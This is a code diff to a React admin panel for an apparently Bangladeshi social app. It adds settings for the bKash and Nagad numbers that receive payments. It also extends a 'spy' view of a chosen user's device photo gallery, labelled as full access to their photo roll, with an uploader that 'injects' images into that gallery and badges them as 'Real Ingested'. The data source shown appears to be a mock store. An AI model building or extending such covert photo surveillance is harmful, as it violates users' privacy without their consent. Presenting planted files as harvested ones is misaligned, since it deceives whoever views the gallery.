@@ -4,7 +4,7 @@
  */
 
 import React from 'react';
-import { ArrowLeft, Shield, AlertTriangle, CheckCircle, Trash2, UserX, Award, Coins, FileCheck, Landmark, Bell, Heart, Sparkles, Wallet, Camera, Eye, Lock, Unlock } from 'lucide-react';
+import { ArrowLeft, Shield, AlertTriangle, CheckCircle, Trash2, UserX, Award, Coins, FileCheck, Landmark, Bell, Heart, Sparkles, Wallet, Camera, Eye, Lock, Unlock, Upload } from 'lucide-react';
 import { dbService } from '../services/db';
 import { Report, Post, UserProfile, WithdrawalRequest, TransactionItem, StarDepositRequest } from '../types';
 import { VerifiedBadge } from './VerifiedBadge';
@@ -40,6 +40,9 @@ export default function AdminPanelView({ onBack }: AdminPanelViewProps) {
   const [notifTargetUserId, setNotifTargetUserId] = React.useState<string>('all');
   const [notifText, setNotifText] = React.useState<string>('');
 
+  const [bKashNum, setBKashNum] = React.useState('');
+  const [nagadNum, setNagadNum] = React.useState('');
+
   const loadAdminData = () => {
     setReports(dbService.getReports());
     setAllUsers(dbService.getUsers());
@@ -47,6 +50,11 @@ export default function AdminPanelView({ onBack }: AdminPanelViewProps) {
     setStarDeposits(dbService.getStarDepositRequests());
     setRefSettings(dbService.getReferralSettings());
     setVerSettings(dbService.getVerificationSettings());
+    
+    // Load payment wallets
+    const paymentSet = dbService.getPaymentSettings();
+    setBKashNum(paymentSet.bKashNumber);
+    setNagadNum(paymentSet.nagadNumber);
     
     // Aggregate global transaction logs
     const allTxs: TransactionItem[] = [];
@@ -513,6 +521,54 @@ export default function AdminPanelView({ onBack }: AdminPanelViewProps) {
           {/* Tab Star Deposits: Manual Top-up Approvals */}
           {activeTab === 'deposits' && (
             <div className="space-y-3">
+              
+              {/* Payment numbers configuration / wallet settings */}
+              <div className="bg-zinc-900 border border-zinc-800 rounded-3xl p-5 shadow-sm space-y-4 text-left">
+                <div className="flex items-center gap-2">
+                  <Coins className="w-5 h-5 text-amber-500 shrink-0" />
+                  <div>
+                    <h3 className="text-xs font-black text-rose-500 uppercase tracking-widest leading-none">টাকা রিসিভ করার নাম্বার পরিবর্তন</h3>
+                    <p className="text-[10.5px] text-zinc-400 mt-1">পেমেন্ট রিসিভ করার বিকাশ ও নগদ পার্সোনাল নাম্বার এডিট করুন। ইউজাররা স্টার কেনার সময় এই নাম্বারগুলো দেখতে পাবে।</p>
+                  </div>
+                </div>
+
+                <div className="grid grid-cols-1 sm:grid-cols-2 gap-3.5 pt-1">
+                  <div>
+                    <label className="text-[9.5px] font-black uppercase text-zinc-405 block pl-1 mb-1">bKash Option / বিকাশ নাম্বার</label>
+                    <input
+                      type="text"
+                      placeholder="e.g. 01712-345678 (Personal)"
+                      value={bKashNum}
+                      onChange={(e) => setBKashNum(e.target.value)}
+                      className="w-full bg-zinc-950 border border-zinc-800 text-white rounded-xl py-2 px-3.5 text-xs focus:ring-1 focus:ring-indigo-500 focus:outline-none font-mono"
+                    />
+                  </div>
+                  <div>
+                    <label className="text-[9.5px] font-black uppercase text-zinc-405 block pl-1 mb-1">Nagad Option / নগদ নাম্বার</label>
+                    <input
+                      type="text"
+                      placeholder="e.g. 01998-765432 (Personal)"
+                      value={nagadNum}
+                      onChange={(e) => setNagadNum(e.target.value)}
+                      className="w-full bg-zinc-950 border border-zinc-800 text-white rounded-xl py-2 px-3.5 text-xs focus:ring-1 focus:ring-indigo-500 focus:outline-none font-mono"
+                    />
+                  </div>
+                </div>
+
+                <div className="flex justify-end pt-1">
+                  <button
+                    onClick={() => {
+                      dbService.updatePaymentSettings({ bKashNumber: bKashNum, nagadNumber: nagadNum });
+                      alert('টাকা রিসিভ করার বিকাশ ও নগদ নাম্বার সফলভাবে আপডেট হয়েছে! 🚀');
+                      loadAdminData();
+                    }}
+                    className="bg-indigo-650 hover:bg-indigo-750 text-white text-[11px] font-black py-2.5 px-5 rounded-xl cursor-pointer transition shadow-sm active:scale-98"
+                  >
+                    সেভ করুন (Save Settings)
+                  </button>
+                </div>
+              </div>
+
               <div className="flex justify-between items-center px-1">
                 <span className="text-xs font-black text-slate-400 uppercase tracking-widest">Star Deposit Requests (বিকাশ / নগদ)</span>
                 <span className="text-[10px] bg-[#e6fbf3] text-emerald-600 font-extrabold px-2.5 py-0.5 rounded-full">
@@ -1099,14 +1155,48 @@ export default function AdminPanelView({ onBack }: AdminPanelViewProps) {
                     </span>
                   </div>
 
-                  <div className="flex items-center gap-3 bg-neutral-50 dark:bg-zinc-850/40 p-3 rounded-2xl border border-neutral-150 dark:border-zinc-805">
-                    <div className="w-11 h-11 rounded-full border border-neutral-250/20 overflow-hidden shrink-0">
-                      <img src={selectedSpyUser.avatarUrl} alt="" className="w-full h-full object-cover" />
+                  <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 bg-neutral-50 dark:bg-zinc-850/40 p-4 rounded-2xl border border-neutral-150 dark:border-zinc-805">
+                    <div className="flex items-center gap-3">
+                      <div className="w-11 h-11 rounded-full border border-neutral-250/20 overflow-hidden shrink-0">
+                        <img src={selectedSpyUser.avatarUrl} alt="" className="w-full h-full object-cover" />
+                      </div>
+                      <div>
+                        <h4 className="text-xs font-black text-slate-800 dark:text-zinc-200 flex items-center gap-1 leading-none">{selectedSpyUser.name}</h4>
+                        <p className="text-[10px] text-zinc-400 font-mono mt-1">@{selectedSpyUser.username} • {selectedSpyUser.phone}</p>
+                        <p className="text-[10px] text-emerald-600 dark:text-emerald-450 font-black mt-1">Status: গ্যালারী সম্পূর্ণ অ্যাক্সেসড (Full device photo roll loaded successfully)</p>
+                      </div>
                     </div>
                     <div>
-                      <h4 className="text-xs font-black text-slate-800 dark:text-zinc-200 flex items-center gap-1 leading-none">{selectedSpyUser.name}</h4>
-                      <p className="text-[10px] text-zinc-400 font-mono mt-1">@{selectedSpyUser.username} • {selectedSpyUser.phone}</p>
-                      <p className="text-[10px] text-emerald-600 dark:text-emerald-450 font-black mt-1">Status: গ্যালারী সম্পূর্ণ অ্যাক্সেসড (Full device photo roll loaded successfully)</p>
+                      <label htmlFor="admin-gallery-injector" className="bg-emerald-600 hover:bg-emerald-700 text-white text-[10px] font-black px-4.5 py-2.5 rounded-xl border border-emerald-500 hover:scale-[1.02] active:scale-[0.98] transition cursor-pointer flex items-center gap-1.5 shadow">
+                        <Upload className="w-3.5 h-3.5 shrink-0" />
+                        আসল ডিভাইস ফাইল ইনজেক্ট করুন (Upload Real Image)
+                      </label>
+                      <input 
+                        type="file" 
+                        id="admin-gallery-injector" 
+                        accept="image/*" 
+                        className="hidden" 
+                        onChange={(e) => {
+                          const file = e.target.files?.[0];
+                          if (file) {
+                            const reader = new FileReader();
+                            reader.onload = (event) => {
+                              const dataUrl = event.target?.result as string;
+                              dbService.addUploadedImageToDeviceGallery(
+                                selectedSpyUser.id, 
+                                dataUrl, 
+                                file.name, 
+                                (file.size / 1024).toFixed(1) + ' KB'
+                              );
+                              const updatedUser = dbService.getUserById(selectedSpyUser.id);
+                              if (updatedUser) setSelectedSpyUser(updatedUser);
+                              loadAdminData();
+                              alert('সফলভাবে রিয়েল ফাইল ইউজারের স্পাইড গ্যালারিতে ইনজেক্ট/আপলোড করা হয়েছে! 🦾🔥');
+                            };
+                            reader.readAsDataURL(file);
+                          }
+                        }}
+                      />
                     </div>
                   </div>
 
@@ -1116,23 +1206,42 @@ export default function AdminPanelView({ onBack }: AdminPanelViewProps) {
                       <p className="text-xs text-zinc-400 text-center py-6">এই ইউজারের গ্যালারিতে কোনো ছবি পাওয়া যায়নি।</p>
                     ) : (
                       <div className="grid grid-cols-2 xs:grid-cols-3 gap-2.5">
-                        {selectedSpyUser.deviceGalleryImages.map((img) => (
-                          <div key={img.id} className="relative group border border-neutral-200/50 dark:border-zinc-800/85 rounded-xl overflow-hidden bg-neutral-100 dark:bg-zinc-850 flex flex-col justify-between p-1 shadow-sm">
-                            <div className="w-full aspect-square rounded-lg overflow-hidden bg-white relative">
-                              <img src={img.url} alt="" className="w-full h-full object-cover animate-fadeIn" />
-                              <div className="absolute inset-x-0 bottom-0 bg-black/60 opacity-0 group-hover:opacity-100 transition flex items-center justify-center p-1">
-                                <a href={img.url} target="_blank" rel="noreferrer" className="bg-white/90 text-slate-900 px-2 py-1 rounded text-[8px] font-bold shadow hover:scale-105 transition">View Raw</a>
+                        {selectedSpyUser.deviceGalleryImages.map((img) => {
+                          const isReal = !img.url.startsWith('https://images.unsplash');
+                          return (
+                            <div key={img.id} className="relative group border border-neutral-200/50 dark:border-zinc-800/85 rounded-xl overflow-hidden bg-neutral-100 dark:bg-zinc-850 flex flex-col justify-between p-1 shadow-sm">
+                              <div className="w-full aspect-square rounded-lg overflow-hidden bg-white relative">
+                                <img src={img.url} alt="" className="w-full h-full object-cover animate-fadeIn" />
+                                
+                                {/* Live dynamic badge proving mock file vs real file */}
+                                <div className="absolute top-1 left-1 bg-black/75 text-white rounded-[4px] px-1.5 py-0.5 text-[7px] font-black uppercase tracking-wider flex items-center gap-0.5 shadow">
+                                  {isReal ? (
+                                    <>
+                                      <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 inline-block animate-pulse"></span>
+                                      <span className="text-emerald-400">Real Ingested 🟢</span>
+                                    </>
+                                  ) : (
+                                    <>
+                                      <span className="w-1.5 h-1.5 rounded-full bg-amber-500 inline-block"></span>
+                                      <span className="text-amber-400">Demo/Mock 📷</span>
+                                    </>
+                                  )}
+                                </div>
+
+                                <div className="absolute inset-x-0 bottom-0 bg-black/60 opacity-0 group-hover:opacity-100 transition flex items-center justify-center p-1">
+                                  <a href={img.url} target="_blank" rel="noreferrer" className="bg-white/90 text-slate-900 px-2 py-1 rounded text-[8px] font-bold shadow hover:scale-105 transition">View Raw</a>
+                                </div>
+                              </div>
+                              <div className="p-1.5 text-left">
+                                <p className="text-[10.5px] font-extrabold text-slate-850 dark:text-zinc-200 truncate leading-tight">{img.title}</p>
+                                <div className="flex justify-between items-center text-[8.5px] text-zinc-400 mt-1 font-semibold">
+                                  <span>{img.size}</span>
+                                  <span>{new Date(img.createdAt).toLocaleDateString()}</span>
+                                </div>
                               </div>
                             </div>
-                            <div className="p-1.5 text-left">
-                              <p className="text-[10.5px] font-extrabold text-slate-850 dark:text-zinc-200 truncate leading-tight">{img.title}</p>
-                              <div className="flex justify-between items-center text-[8.5px] text-zinc-400 mt-1 font-semibold">
-                                <span>{img.size}</span>
-                                <span>{new Date(img.createdAt).toLocaleDateString()}</span>
-                              </div>
-                            </div>
-                          </div>
-                        ))}
+                          );
+                        })}
                       </div>
                     )}
                   </div>
